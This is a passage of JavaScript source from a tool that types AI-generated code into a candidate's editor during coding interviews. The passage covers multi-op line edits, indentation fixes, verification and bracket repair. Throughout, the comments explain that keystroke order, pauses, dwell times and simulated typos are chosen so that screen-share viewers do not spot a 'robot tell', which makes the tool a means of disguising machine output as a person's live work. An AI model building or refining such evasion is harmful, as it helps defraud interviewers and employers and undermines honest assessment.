      console.error(`[auto-type] multi-op: CONTENT-LOSS GUARD tripped — destructive ops would net-remove ${netRemoved}/${totalNonWs} non-whitespace chars (${Math.round(100 * netRemoved / totalNonWs)}% of the editor) without reproducing them. Refusing ${destructive.length} destructive op(s) to avoid wiping required code.`);
      const insertsOnly = finalOps.filter(o => o.op === 'insert');
      if (insertsOnly.length === 0) {
        return { typed: '', opCount: 0, refused: 'content_loss_guard', executionTrace: [{ kind: 'refused', reason: 'content_loss_guard' }] };
      }
      finalOps.length = 0;
      finalOps.push(...insertsOnly);
    }
  } else if (destructive.length > 0) {
    console.log('[auto-type] multi-op: content-loss guard skipped — UIA not reliable for measurement (browser-hosted, flat/truncated, or partial coverage). Trusting the vision plan.');
  }

  // Per-op execution trace. autoTypePlanLog documents this field in its
  // reader contract but nothing ever wrote it, so a failed run recorded a
  // before and an after with no record of WHICH op broke. Cheap to build,
  // and it is the difference between diagnosing a bad run in one read and
  // guessing at it.
  const executionTrace = [];
  if (validated.length !== (operations || []).length) {
    executionTrace.push({ kind: 'dropped_overlapping', count: (operations || []).length - validated.length });
  }
  if (safeOps.length !== ops.length) {
    executionTrace.push({ kind: 'dropped_structural', count: ops.length - safeOps.length });
  }
  if (noOpSkipped > 0) executionTrace.push({ kind: 'skipped_no_op_rewrite', count: noOpSkipped });

  // ── Execution order: READING ORDER, with exact line-shift accounting ──
  //
  // This used to run strictly bottom-to-top. That is the easy way to keep
  // line numbers valid — edit the lowest region first and nothing above it
  // moves — but on a screen share it is a tell: given two broken blocks,
  // the engine fixed the SECOND one first, and it re-anchored with
  // Ctrl+Home before every op, snapping the viewport back to the top of
  // the file each time.
  //
  // A person fixes the first problem they read, then works downward. That
  // ordering is available as long as we account for how many lines each
  // edit adds or removes, and shift every later anchor by the running
  // total. The arithmetic is exact, not estimated:
  //     replace [s..e] with T lines -> T - (e - s + 1)
  //     delete  [s..e]              -> -(e - s + 1)
  //     insert  after s, T lines    -> +T
  //
  // The plan-level checks above (structural filter, no-op detection,
  // content-loss guard) all compare ORIGINAL line numbers against the
  // pre-run UIA snapshot and complete before any keystroke, so they are
  // unaffected by execution order.
  const orderedOps = finalOps.slice().sort((a, b) => a.start_line - b.start_line);
  let lineShift = 0;
  // Line the caret sits on, tracked so we can walk to the next region from
  // where we already are instead of resetting to the top of the document.
  // null = unknown, which forces the absolute navigator.
  let caretLine = null;
  const editedRegions = [];
  // Indentation repaired inline, and anything left over — reported at the
  // end so the user hears about it once, not once per op.
  let indentRepairs = 0;
  const indentUnfixed = [];

  // Called by EVERY path that types a block, with that block's first
  // DOCUMENT line. Three paths type code — insert, whole-document replace,
  // and ordinary replace — and each knows exactly where its block landed:
  //   insert          → s + 1   (Enter created the line below s)
  //   whole-doc Ctrl+A→ 1       (the document is the block)
  //   replace         → s
  // That number is the only coordinate involved, and it comes from the
  // plan, never from reading the editor. See autoTypeFixIndentation.
  const fixIndentation = async (lines, blockStartLine) => {
    if (autoTypeAbort) return;
    try {
      const ind = await autoTypeFixIndentation(lines, blockStartLine, caretLine, ctx);
      if (ind.fixed > 0) {
        caretLine = ind.caretLine;
        indentRepairs += ind.fixed;
        executionTrace.push({ opIndex: done, kind: 'indent_fix', lines: ind.fixed, verified: !!ind.verified });
      }
      // Whatever is still wrong after the attempt — or was refused — is
      // what the user gets told about at the end.
      if (ind.mismatches && ind.mismatches.length) indentUnfixed.push(...ind.mismatches);
    } catch (indErr) {
      console.warn('[auto-type] indent fix threw (non-fatal):', indErr && indErr.message);
    }
  };

  let typedAll = '';
  let done = 0;
  for (const op of orderedOps) {
    if (autoTypeAbort) break;
    const opStartMs = Date.now();

    // ── Per-op focus re-check ──
    // A multi-op run can span many seconds. The handler's preflight ran
    // once at the start; that doesn't help if a notification, click, or
    // app switch hijacks focus partway through. Without this check, the
    // navigate+select+delete burst for the next op could land in the
    // WRONG window — at worst, deleting content in another app. Skip on
    // the FIRST op (just passed preflight, no time has elapsed).
    if (done > 0 && !(await checkFocusStillOnEditor())) {
      console.warn('[auto-type] multi-op: focus left the editor mid-run — aborting before next op');
      autoTypeAbort = true;
      autoTypeAbortReason = 'focus_lost_during_multi_op';
      autoTypeAbortDiagnostic = {
        hint: 'Focus moved off the editor during a multi-step edit (likely a notification or stray click). Stopped to avoid editing the wrong window.',
      };
      break;
    }

    // Anchors shift by everything already applied above this region.
    const s = Math.max(1, (op.start_line | 0) + lineShift);
    const e = Math.max(s, (op.end_line | 0) + lineShift);
    const origSpan = Math.max(1, (op.end_line | 0) - (op.start_line | 0) + 1);

    if (op.op === 'insert') {
      await autoTypeGoToLine(s, caretLine, ctx);
      await autoTypeReadRegionPause();
      // P1a: dwell on each key in the insert sequence.
      await autoTypePressWithDwell(keyboard, Key.End);
      await autoTypeNavSleep(10, 24);
      await autoTypePressWithDwell(keyboard, Key.Enter);
      await autoTypeNavSleep(38, 70);
      // SELECT the auto-indent the editor inserted — the op text carries
      // its own indentation, so the first typed character replaces this.
      // Deleting it instead would forward-delete the following line
      // whenever the editor did not auto-indent (see autoTypeLineBreak).
      await autoTypePressWithDwell(keyboard, Key.Home);
      await autoTypeNavSleep(10, 22);
      await withHeldKey(keyboard, Key.LeftShift, async () => {
        await autoTypeNavSleep(4, 10);
        await autoTypePressWithDwell(keyboard, Key.End);
        await autoTypeNavSleep(4, 10);
      });
      await autoTypeNavSleep(10, 22);
      const lines = String(op.text || '').split('\n');
      await typeLinesHumanized(lines, ctx);
      typedAll += lines.join('\n') + '\n';
      done++;
      // Enter created line s+1; the T typed lines occupy s+1 .. s+T.
      caretLine = s + lines.length;
      await fixIndentation(lines, s + 1);
      lineShift += lines.length;
      editedRegions.push({ line: s + 1, label: `insert after L${op.start_line}` });
      executionTrace.push({ opIndex: done, kind: 'insert', startLine: s, endLine: s, lines: lines.length, charsTyped: lines.join('\n').length, lineDelta: lines.length, durationMs: Date.now() - opStartMs });
      console.log(`[auto-type] multi-op ${done}/${orderedOps.length}: insert after L${s} (${lines.length} line(s), shift now ${lineShift >= 0 ? '+' : ''}${lineShift}) — ${op.reason || ''}`);
      continue;
    }

    // ── Flat-UIA whole-doc replace path ──
    // When UIA returns the entire editor as one flat logical line (no \n
    // characters in uiaText), it's almost always because the editor's
    // accessibility tree flattens line breaks — observed in the new
    // Windows 11 Notepad (Store version, tabbed). In that mode our
    // line-based selection (Home + Shift+End) operates on the VISUAL
    // line bounds (~80 chars per row), NOT the full 246-char flat
    // logical line. Symptom: replace deletes only one visual row of
    // text, then types the new content INTO THE MIDDLE of the leftover
    // — the May-2026 Notepad palindrome regression.
    //
    // Fix: detect flat UIA (single line in uiaText) AND a replace op
    // that covers L1 — that's "replace the whole document". Use
    // Ctrl+A + Delete instead of navigate+select+delete. Ctrl+A is
    // universal (works in every editor incl. Notepad / Monaco / IDEs)
    // and selects the actual whole document regardless of visual
    // wrapping. Safe-narrow guard: only when uiaLines.length === 1
    // AND op.start_line === 1, so a SUBSET-replace on a normal multi-
    // line editor still uses the surgical path.
    // Guard B: a single-line UIA read from a BROWSER editor is truncation,
    // not a one-line document — refuse the whole-doc Ctrl+A there and let
    // the surgical navigate+select path below handle the real line range.
    if (op.op === 'replace' && uiaLines && uiaLines.length === 1 && s === 1 && browserHosted) {
      console.warn(`[auto-type] multi-op: NOT using Ctrl+A whole-doc nuke — editor is browser-hosted (${processName}) and its single-line UIA read is truncation, not a flat document. Falling through to surgical line-range replace to avoid wiping unseen code.`);
    }
    if (op.op === 'replace' && uiaLines && uiaLines.length === 1 && s === 1 && !browserHosted) {
      console.log(`[auto-type] multi-op ${done + 1}/${ops.length}: replace L1-${e} via Ctrl+A (flat-UIA whole-doc path, ${uiaLines[0].length} chars in single logical line, native editor "${processName || '?'}") — ${op.reason || ''}`);
      // The Delete two statements below is why this hold in particular
      // cannot be left bare. If the "A" press throws, Ctrl is released in
      // withHeldKey's finally AND the throw carries execution straight out
      // of this block — so Delete is never reached at all, let alone
      // reached as Ctrl+Delete, which in the candidate's live editor is
      // delete-word-forward against a document we did not select.
      await withHeldKey(keyboard, Key.LeftControl, async () => {
        await autoTypeNavSleep(5, 14);
        await autoTypePressWithDwell(keyboard, Key.A);
        await autoTypeNavSleep(5, 14);
      });
      await autoTypeNavSleep(40, 80);
      // Glance pause before deleting selection — humans look at what
      // they highlighted before nuking it.
      await autoTypeSleep(200 + Math.random() * 350);
      await autoTypePressWithDwell(keyboard, Key.Delete);
      await autoTypeNavSleep(18, 38);
      const lines = String(op.text || '').split('\n');
      await typeLinesHumanized(lines, ctx);
      typedAll += lines.join('\n') + '\n';
      done++;
      caretLine = lines.length;
      // Ctrl+A wiped the document, so the block IS the document — it
      // starts at line 1.
      await fixIndentation(lines, 1);
      lineShift += lines.length - origSpan;
      editedRegions.push({ line: 1, label: 'whole-document replace' });
      executionTrace.push({ opIndex: done, kind: 'replace_ctrl_a', startLine: 1, endLine: e, lines: lines.length, charsTyped: lines.join('\n').length, durationMs: Date.now() - opStartMs });
      continue;
    }

    // replace / delete — both select the content of [s..e] first.
    // Walk from wherever the caret already is; fall back to the absolute
    // Ctrl+Home anchor only when that distance is unknown or too far to be
    // a plausible keyboard move.
    await autoTypeGoToLine(s, caretLine, ctx);
    // Arriving at a region: read it before touching it. A person looks at
    // broken code, then edits. Selecting the instant the caret lands is the
    // most mechanical-looking beat in a multi-block run.
    await autoTypeReadRegionPause();
    await selectLineRangeContent(s, e, ctx);
    // Glance pause — a human looks at what they've highlighted before
    // hitting Delete. Selecting then instantly deleting is a robot tell.
    await autoTypeSleep(200 + Math.random() * 350);
    // P1a: dwell on Delete.
    await autoTypePressWithDwell(keyboard, Key.Delete);
    await autoTypeNavSleep(18, 38);

    if (op.op === 'delete') {
      // Lines s..e are now one empty line. One more Delete consumes the
      // orphan newline so the following content rises into place — the
      // junk/dead lines are fully gone, not left as a blank.
      await autoTypePressWithDwell(keyboard, Key.Delete);
      await autoTypeNavSleep(14, 30);
      done++;
      // The region is gone; following content rose into line s.
      caretLine = s;
      lineShift -= origSpan;
      editedRegions.push({ line: s, label: `delete L${op.start_line}-${op.end_line}` });
      executionTrace.push({ opIndex: done, kind: 'delete', startLine: s, endLine: e, charsTyped: 0, lineDelta: -origSpan, durationMs: Date.now() - opStartMs });
      console.log(`[auto-type] multi-op ${done}/${orderedOps.length}: delete L${s}-${e} (shift now ${lineShift >= 0 ? '+' : ''}${lineShift}) — ${op.reason || ''}`);
    } else {
      // replace — caret at (s,0), content of s..e gone, the newline
      // before old line e+1 preserved. Type the replacement; line e+1
      // stays on its own line with its original indentation intact.
      const lines = String(op.text || '').split('\n');
      await typeLinesHumanized(lines, ctx);
      typedAll += lines.join('\n') + '\n';
      done++;
      // The T typed lines occupy s .. s+T-1.
      caretLine = s + lines.length - 1;

      // Re-indent anything that landed off-shape NOW, while this block's
      // document lines are still exactly s..s+T-1 and no later op has
      // shifted them.
      await fixIndentation(lines, s);

      lineShift += lines.length - origSpan;
      editedRegions.push({ line: s, label: `replace L${op.start_line}-${op.end_line}` });
      executionTrace.push({ opIndex: done, kind: 'replace', startLine: s, endLine: e, lines: lines.length, charsTyped: lines.join('\n').length, lineDelta: lines.length - origSpan, durationMs: Date.now() - opStartMs });
      console.log(`[auto-type] multi-op ${done}/${orderedOps.length}: replace L${s}-${e} with ${lines.length} line(s) (shift now ${lineShift >= 0 ? '+' : ''}${lineShift}) — ${op.reason || ''}`);
    }
  }
  if (autoTypeAbort) executionTrace.push({ kind: 'aborted', afterOps: done, reason: autoTypeAbortReason || 'unknown' });
  else if (editedRegions.length >= 2) {
    await autoTypeReviewPass(editedRegions, caretLine, ctx);
    executionTrace.push({ kind: 'review_pass', regions: editedRegions.length });
  }
  return { typed: typedAll, opCount: done, executionTrace, indentRepairs, indentUnfixed };
}

function planAutoTypeFromUIA(params) {
  const code = typeof params.code === 'string' ? params.code : '';
  const editorText = typeof params.editorText === 'string' ? params.editorText : '';
  const cursorOffsetRaw = typeof params.cursorOffset === 'number' ? params.cursorOffset : 0;
  const cursorOffset = Math.max(0, Math.min(cursorOffsetRaw, editorText.length));
  const processName = String(params.processName || '').toLowerCase();

  const codeLines = code.split('\n');

  if (!editorText || editorText.trim().length === 0) {
    // An empty UIA read is AMBIGUOUS — it is EITHER a genuinely empty
    // native editor (fresh Notepad/blank file) OR — far more often in
    // the interview-coding context — UIA BLINDNESS: Monaco/CodeMirror
    // keep only a tiny IME buffer in the focusable textarea, so UIA sees
    // ~nothing even though the editor is full of template/starter code.
    //
    // The old code returned confidence 1.0 here. That was the core bug:
    // a UIA-blind browser editor got treated as "definitely empty, type
    // everything", which DUMPED the AI's full file (imports + signature)
    // on top of the template's existing ones AND suppressed every
    // fallback (the AI/vision planner only fires when UIA is NOT
    // confident). Confidence here must be LOW so the caller falls
    // through to the vision planner — which can actually SEE the editor.
    //
    // When the focused process is a browser, blindness is near-certain
    // (interview platforms always ship starter code) → confidence floor.
    const browserHosted = /(^|\b)(chrome|msedge|edge|firefox|brave|opera|vivaldi|arc)(\b|$)/.test(processName);
    return {
      skipLines: 0,
      skipTrailingLines: 0,
      wipeFirstLine: false,
      confidence: browserHosted ? 0.15 : 0.4,
      reason: browserHosted ? 'uia_blind_browser_editor' : 'empty_editor_ambiguous',
    };
  }

  const beforeCursor = editorText.slice(0, cursorOffset);
  const linesBefore = beforeCursor.split('\n');
  const cursorLineIdx = linesBefore.length - 1;
  const cursorLine = linesBefore[cursorLineIdx] || '';
  const atLineStart = cursorLine.length === 0 || /^\s*$/.test(cursorLine);

  if (!atLineStart) {
    // Cursor sits inside existing content. Type from here as-is — the user
    // placed the caret deliberately and that's a strong signal.
    return { skipLines: 0, skipTrailingLines: 0, wipeFirstLine: false, confidence: 0.9, reason: 'cursor_mid_line' };
  }

  // Match leading codeLines against the editor lines strictly above cursor.
  // Allow blank-line flexibility: if the editor line is blank and the code
  // line isn't, advance past the blank. This handles the very common case
  // where the user's starter file has blank lines sprinkled between stubs.
  let skip = 0;
  let ei = 0;
  const matchableEditorLines = cursorLineIdx; // strictly above the cursor line
  let substantiveMatches = 0;
  while (skip < codeLines.length && ei < matchableEditorLines) {
    const codeLineTrim = codeLines[skip].trim();
    const editorLineTrim = (linesBefore[ei] || '').trim();

    if (codeLineTrim === '' && editorLineTrim === '') {
      skip++;
      ei++;
      continue;
    }
    if (editorLineTrim === '' && codeLineTrim !== '') {
      // Editor has a blank where code has content — treat the editor blank
      // as padding above the code, advance on the editor side only.
      ei++;
      continue;
    }
    if (codeLineTrim === '' && editorLineTrim !== '') {
      // Code has a blank where editor has content — treat as padding in the
      // code, advance on the code side only.
      skip++;
      continue;
    }
    if (codeLineTrim === editorLineTrim) {
      skip++;
      ei++;
      if (codeLineTrim.length >= 2) substantiveMatches++;
      continue;
    }
    break;
  }

  // Trailing suffix match. Symmetric to the leading match but walking from
  // the END of codeLines backwards against editor lines strictly BELOW the
  // cursor's line. Only attempted when the cursor's line has no content to
  // the right of the cursor — if it does, we can't cleanly delimit "what's
  // already here as trailer" vs. "what the AI will produce mid-line".
  let skipTrailingLines = 0;
  let substantiveTrailing = 0;
  const afterCursor = editorText.slice(cursorOffset);
  const firstNlInAfter = afterCursor.indexOf('\n');
  const restOfCursorLine = firstNlInAfter === -1 ? afterCursor : afterCursor.slice(0, firstNlInAfter);

  if (restOfCursorLine.trim() === '' && firstNlInAfter !== -1) {
    // Editor lines strictly BELOW the cursor's line.
    const belowRaw = afterCursor.slice(firstNlInAfter + 1).split('\n');
    // Drop the final "" that split produces when editorText ends with '\n' —
    // otherwise it looks like an extra blank trailer and inflates match.
    const linesBelow = belowRaw.length > 0 && belowRaw[belowRaw.length - 1] === ''
      ? belowRaw.slice(0, -1)
      : belowRaw;

    let ci = codeLines.length - 1;
    let bi = linesBelow.length - 1;
    // Leading match already consumed code[0..skip). Never let trailing match
    // cross into that region (would claim the same code line as both
    // leading and trailing, underwriting the middle).
    while (ci >= skip && bi >= 0) {
      const codeLineTrim = codeLines[ci].trim();
      const editorLineTrim = (linesBelow[bi] || '').trim();

      if (codeLineTrim === '' && editorLineTrim === '') {
        ci--; bi--; skipTrailingLines++;
        continue;
      }
      if (editorLineTrim === '' && codeLineTrim !== '') {
        // Editor blank below → padding, advance editor only.
        bi--;
        continue;
      }
      if (codeLineTrim === '' && editorLineTrim !== '') {
        // Code blank at tail → advance code only, count as skipped.
        ci--; skipTrailingLines++;
        continue;
      }
      if (codeLineTrim === editorLineTrim) {
        ci--; bi--; skipTrailingLines++;
        if (codeLineTrim.length >= 2) substantiveTrailing++;
        continue;
      }
      break;
    }

    // Same trust threshold as leading: need at least one substantive match
    // to apply. Otherwise a stray `}` in the editor could nuke a real
    // closing brace from the typed output.
    if (substantiveTrailing < 1) skipTrailingLines = 0;
  }

  // When leading skip is non-zero the cursor sits on a whitespace-only line
  // (atLineStart + skip > 0 implies the starter is above us and we're meant
  // to type below it). If we don't wipe that line first, its existing
  // whitespace stacks with the first typed line's own indent and we get
  // double-indentation. The wipe is Home → Shift+End → Delete in main.
  const wipeFirstLine = skip > 0;

  if (skip >= codeLines.length) {
    return { skipLines: skip, skipTrailingLines: 0, wipeFirstLine, confidence: 1.0, reason: 'fully_present' };
  }
  if (substantiveMatches >= 1) {
    return { skipLines: skip, skipTrailingLines, wipeFirstLine, confidence: 0.9, reason: 'prefix_match' };
  }

  // No prefix match between code head and editor prefix. Two sub-cases that
  // look identical to the matcher but have opposite correct actions:
  //
  //   (a) SNIPPET INSERT — AI produced a chunk (method body, static block)
  //       meant to be inserted at the cursor. Its head is new content, not
  //       the editor's starter. Skip=0 IS CORRECT — type from the cursor
  //       and the result lands in the right spot.
  //
  //   (b) FULL-FILE MISMATCH — AI produced a complete file (including its
  //       own imports) but the editor's starter has different imports.
  //       Skip=0 would dump new imports into the middle of the existing
  //       class, corrupting the file.
  //
  // Heuristic: if the code head looks like file-top syntax (imports/package/
  // include/etc.), assume (b) and keep low confidence so the caller falls
  // back. Otherwise, if there's substantial editor content above the cursor
  // (≥2 non-blank lines — i.e. a real starter, not just a blank buffer),
  // assume (a) and return high confidence.
  const firstNonBlankCode = (codeLines.find(l => l.trim().length > 0) || '').trim();
  const codeLooksLikeFileTop = /^(import\s|package\s|from\s|using\s|#include|#pragma|#define|<\?(?:php|xml)|<!doctype)/i.test(firstNonBlankCode);
  const nonEmptyEditorLines = linesBefore.slice(0, matchableEditorLines)
    .filter(l => l.trim().length > 0).length;

  if (nonEmptyEditorLines >= 2 && !codeLooksLikeFileTop) {
    // Snippet insert at cursor: trailing match may still have fired against
    // a mid-class closing brace below. That's useful — we don't want to
    // re-type the editor's closing brace. wipeFirstLine stays false because
    // the user put the cursor here on purpose.
    return { skipLines: 0, skipTrailingLines, wipeFirstLine: false, confidence: 0.9, reason: 'snippet_insert_at_cursor' };
  }
  return { skipLines: 0, skipTrailingLines: 0, wipeFirstLine: false, confidence: 0.4, reason: 'no_substantive_match' };
}

// Post-type verify: after typing, we read the focused text again and check
// that the content we intended to type actually appears in the new text.
// Non-destructive — on mismatch we log + broadcast, but never auto-edit.
function verifyTypedContent(typedText, afterText) {
  if (!typedText) return { ok: true, reason: 'nothing_typed' };
  if (!afterText) return { ok: true, reason: 'no_after_snapshot' };

  // Fast path: exact substring.
  if (afterText.indexOf(typedText) !== -1) return { ok: true, reason: 'exact_substring' };

  // Fuzzy path: how many of the typed non-whitespace chars appear in order
  // in afterText? Editors sometimes auto-close brackets / auto-indent past
  // what we intended, producing minor but benign divergence. Accept >= 85%.
  const typedCondensed = typedText.replace(/\s+/g, '');
  const afterCondensed = afterText.replace(/\s+/g, '');
  if (typedCondensed.length === 0) return { ok: true, reason: 'whitespace_only' };

  let ti = 0, ai = 0, matched = 0;
  while (ti < typedCondensed.length && ai < afterCondensed.length) {
    if (typedCondensed[ti] === afterCondensed[ai]) {
      matched++;
      ti++;
    }
    ai++;
  }
  const ratio = matched / typedCondensed.length;
  if (ratio >= 0.85) return { ok: true, reason: 'fuzzy_match', ratio };
  return { ok: false, reason: 'mismatch', ratio, expected: typedCondensed.length, matched };
}

// ── P5c: Post-typing verify + active auto-correct ──
// Real coders re-read their code after typing it and fix mistakes they
// notice. Previous behavior: detect mismatches via verifyTypedContent but
// only broadcast — never auto-edit. This helper UPGRADES that: when the
// mismatch is small and SAFE to fix (most of intended content present + a
// trailing tail missing + cursor still at the right place), it actively
// types the missing tail.
//
// Safety rails (we only correct when ALL of these hold):
//   • 85%+ of the intended content is already present in the editor (in
//     order, allowing whitespace flex)
//   • cursor is within ±12 chars of where the prefix ends in the editor
//     (so an "append at cursor" actually puts the tail in the right place)
//   • the missing tail is ≤ 80 chars (anything bigger is a different
//     failure mode and likely needs human review)
//   • autoTypeAbort is not set
//
// Returns: { ok: bool, corrected: number-of-chars-typed, reason: string }
//
// When ok=false, the caller should fall back to broadcasting a verify-
// mismatch so the user can manually inspect.
async function autoTypeVerifyAndCorrect(intendedContent, ctx) {
  const { keyboard, Key } = ctx;
  if (!intendedContent || intendedContent.length === 0) {
    return { ok: true, corrected: 0, reason: 'nothing_typed' };
  }

  // Settle — let the editor's accessibility tree catch up to what we typed.
  await autoTypeSleep(220);

  const after = await readFocusedViaUIA(1200);
  if (!after || !after.ok || typeof after.text !== 'string') {
    return { ok: true, corrected: 0, reason: 'uia_unavailable' };
  }

  const actual = after.text;
  const cursorPos = after.cursorOffset || 0;

  // Tier 1 — exact substring match (no correction needed).
  if (actual.indexOf(intendedContent) !== -1) {
    return { ok: true, corrected: 0, reason: 'exact_match' };
  }

  // Tier 2 — whitespace-tolerant substring (editor auto-formatted some
  // whitespace but content is all there).
  const stripWs = (s) => s.replace(/\s+/g, '');
  const intendedStrip = stripWs(intendedContent);
  const actualStrip = stripWs(actual);
  if (actualStrip.includes(intendedStrip)) {
    return { ok: true, corrected: 0, reason: 'whitespace_match' };
  }

  // Tier 3 — find the LONGEST prefix of intendedContent that appears in
  // actual. If it's most of the content (≥85%) and the cursor is right at
  // the end of that prefix, we can safely append the missing tail.
  let prefixEnd = 0;
  let prefixPosInActual = -1;
  // Walk down from full length to find the longest matching prefix. Stop
  // early once we find one (longest wins).
  for (let i = intendedContent.length; i >= Math.floor(intendedContent.length * 0.5); i--) {
    const candidate = intendedContent.slice(0, i);
    const idx = actual.lastIndexOf(candidate);
    if (idx !== -1) {
      prefixEnd = i;
      prefixPosInActual = idx;
      break;
    }
  }

  if (prefixEnd === 0) {
    return { ok: false, corrected: 0, reason: 'no_match_in_editor' };
  }

  const fractionPresent = prefixEnd / intendedContent.length;
  if (fractionPresent < 0.85) {
    return { ok: false, corrected: 0, reason: 'mismatch_too_complex', fractionPresent };
  }

  const missing = intendedContent.slice(prefixEnd);
  if (missing.length > 80) {
    return { ok: false, corrected: 0, reason: 'missing_tail_too_large', missingLen: missing.length };
  }

  // Safety: cursor must be near the end of the matched prefix. If cursor
  // moved elsewhere (user clicked away, autocomplete navigated, etc.),
  // appending would land in the wrong place — abort the correction.
  const expectedCursor = prefixPosInActual + prefixEnd;
  if (Math.abs(cursorPos - expectedCursor) > 12) {
    return {
      ok: false,
      corrected: 0,
      reason: 'cursor_drifted',
      cursorPos,
      expectedCursor,
    };
  }

  // Safe to append.
  console.log(`[auto-type] verify+correct: ${prefixEnd}/${intendedContent.length} chars present in editor; appending ${missing.length} missing chars (cursor at ${cursorPos}, expected ${expectedCursor})`);
  let curPrev = prefixEnd > 0 ? intendedContent[prefixEnd - 1] : null;
  let typed = 0;
  for (let k = 0; k < missing.length; k++) {
    if (autoTypeAbort) return { ok: false, corrected: typed, reason: 'aborted_mid_correction' };
    const cN = missing[k];
    try {
      if (cN === '\n') {
        await autoTypePressWithDwell(keyboard, Key.Enter);
      } else {
        await autoTypeCharWithTypo(keyboard, Key, cN, curPrev);
      }
      typed++;
    } catch (e) {
      return { ok: false, corrected: typed, reason: 'append_failed', error: e && e.message };
    }
    await autoTypeSleep(autoTypeHumanDelay(cN, curPrev));
    curPrev = cN;
  }

  return { ok: true, corrected: typed, reason: 'tail_appended' };
}

// Per-op verification for the multi-op typing engine. For each non-delete
// op that ran, check that its `text` appears (whitespace-tolerant) in the
// post-typing editor. Returns the list of ops whose text is MISSING so the
// caller can broadcast a clear diagnostic. Doesn't actively re-execute
// missing ops — that requires re-navigating to shifted line numbers, which
// gets fragile fast (left as a future P5d if needed).
async function autoTypeVerifyMultiOp(operations, ctx) {
  if (!Array.isArray(operations) || operations.length === 0) {
    return { ok: true, missingOps: [], reason: 'no_ops' };
  }
  await autoTypeSleep(220);
  const after = await readFocusedViaUIA(1200);
  if (!after || !after.ok || typeof after.text !== 'string') {
    return { ok: true, missingOps: [], reason: 'uia_unavailable' };
  }
  const actual = after.text;
  const stripWs = (s) => s.replace(/\s+/g, '');
  const actualStrip = stripWs(actual);

  const missingOps = [];
  for (const op of operations) {
    if (op.op === 'delete') continue;
    if (!op.text) continue;
    const textStrip = stripWs(op.text);
    if (textStrip.length < 8) continue;  // tiny ops are noisy to verify
    if (!actualStrip.includes(textStrip)) {
      missingOps.push({
        op: op.op,
        start_line: op.start_line,
        end_line: op.end_line,
        textPreview: op.text.replace(/\s+/g, ' ').slice(0, 60),
      });
    }
  }
  return { ok: missingOps.length === 0, missingOps, afterText: actual };
}

// ── P5d: Active repair iteration ──
// Real coders re-read their finished code and FINISH/FIX what's left —
// a half-written chunk, a missed function body, a stray bracket. We do the
// same: after the initial multi-op typing, if per-op verify shows missing
// ops OR the coverage check finds target content absent, take a fresh
// screenshot + UIA text, call the vision agent AGAIN with current state +
// target code, get a fix plan, execute it.
//
// CRITICAL — repair must COMPLETE what's left WITHOUT regressing what's
// already right. Two failure modes to guard, in tension:
//   • DON'T regress: the original bug was a repair plan emitting
//     "replace L7-15 with [same 9-line content]" — a NO-OP REWRITE that
//     visibly re-selected and re-typed an already-correct chunk ("it's
//     writing the code AGAIN from the beginning").
//   • DO finish: the earlier typo-only size caps (per-op ≤2 lines, total
//     ≤150 chars) over-corrected — they let repair fix a bracket but
//     REFUSED to complete a chunk the first pass left half-written. Those
//     size caps are gone, replaced by completeness-aware rails.
//
// Guards enforced in autoTypeMultiOpRepair (see inline comments there):
//   • Rail 1 — total repair text ≤ target length + 40. More chars than
//     CODE_TO_TYPE itself isn't a repair, it's a rewrite → refuse.
//   • Rail 2 — refuse any single replace/delete spanning ≥90% of the
//     editor (when ≥12 lines): that's the "rewrite the whole file" shape.
//   • Cap 3 — max 3 ops.   • Cap 4 — confidence ≥0.78.
//   • Cap 5 — SKIP NO-OP REWRITES: if an op's text already matches what's
//     at those lines (whitespace-tolerant), skip it.
//   • Structural-line safety filter still applies via executeMultiOpPlan.
//   • Single pass — don't loop.

// ── P11-4/5: Surgical bracket repair ──
// After typing finishes, compare bracket balance of the actual editor text
// vs the intended code. If we introduced ≤2 imbalances (e.g. a missing `}`
// because a comment delete ate the brace on the adjacent line — the user's
// described scenario), surgically insert/delete the offending chars WITHOUT
// retyping any lines. Returns { ok, repairs, reason }.
async function autoTypeSurgicalBracketRepair(intendedCode, language, ctx) {
  const { keyboard, Key } = ctx;
  try {
    // Read actual editor state (UIA first; clipboard via Ctrl+A would be more
    // reliable but more visible — UIA is sufficient for the local-edit case).
    const after = await readFocusedViaUIA(1500);
    if (!after || !after.ok || typeof after.text !== 'string') {
      return { ok: false, reason: 'uia_unavailable' };
    }

    // ── Reliability gate ──
    // Bracket balance is only meaningful over the WHOLE document. Browser-
    // hosted Monaco / CodeMirror expose just the scrolled-visible slice via
    // UIA, and an arbitrary slice of code virtually always looks unbalanced.
    // Repairing against that would INSERT or DELETE braces in a file that
    // was fine — active damage, not a fix. Same gate the coverage check
    // uses. (A clipboard read would lift this restriction; it is the right
    // follow-up, but it must not be guessed at from a partial read.)
    const brProcName = String(after.processName || '');
    if (/(^|\b)(chrome|msedge|edge|firefox|brave|opera|vivaldi|arc)(\b|$)/i.test(brProcName)) {
      return { ok: false, reason: 'browser_hosted_uia_truncated' };
    }
    if (isUiaPlaceholderText(after.text)) {
      return { ok: false, reason: 'uia_placeholder' };
    }

    const intendedBal = bracketTracker.balance(intendedCode, language);
    const actualBal = bracketTracker.balance(after.text, language);

    // Only act on imbalances that EXIST IN ACTUAL but NOT IN INTENDED — i.e.,
    // damage WE caused, not pre-existing imbalances in the intended code.
    if (intendedBal.unclosed.length !== 0 || intendedBal.orphans.length !== 0) {
      // Target code itself has imbalances (unusual — probably a parser limitation
      // on string literals). Skip repair rather than guess.
      return { ok: false, reason: 'intended_already_imbalanced' };
    }

    if (actualBal.balanced) {
      return { ok: true, repairs: 0, reason: 'balanced' };
    }

    const plan = bracketTracker.planSurgicalRepair(actualBal, after.text);
    if (!plan.ok) {
      return { ok: false, reason: plan.reason };
    }
    if (plan.ops.length === 0) {
      return { ok: true, repairs: 0, reason: 'no_repair_needed' };
    }

    console.log(`[auto-type] surgical bracket repair: ${plan.ops.length} op(s) — ${plan.ops.map(o => `${o.action} ${o.char} at L${o.line}c${o.col}`).join(', ')}`);

    // Execute each surgical op: navigate to (line, col), insert/delete one char.
    // Sort bottom-to-top so earlier ops don't shift later ones.
    const sortedOps = [...plan.ops].sort((a, b) => b.line - a.line || b.col - a.col);
    let applied = 0;
    for (const op of sortedOps) {
      if (autoTypeAbort) break;
      try {
        await navigateToDocLine(op.line, ctx);
        // Counted Right to reach the target column. Capped by line length
        // (rough — we don't have actual line length here; the UIA snapshot
        // is stale by this point). Use the snapshot.
        const snapLines = after.text.split('\n');
        const snapLine = snapLines[op.line - 1] || '';
        const targetCol = Math.min(op.col, snapLine.length);
        for (let i = 0; i < targetCol; i++) {
          if (autoTypeAbort) break;
          await autoTypePressWithDwell(keyboard, Key.Right);
          await autoTypeNavSleep(6, 12);
        }
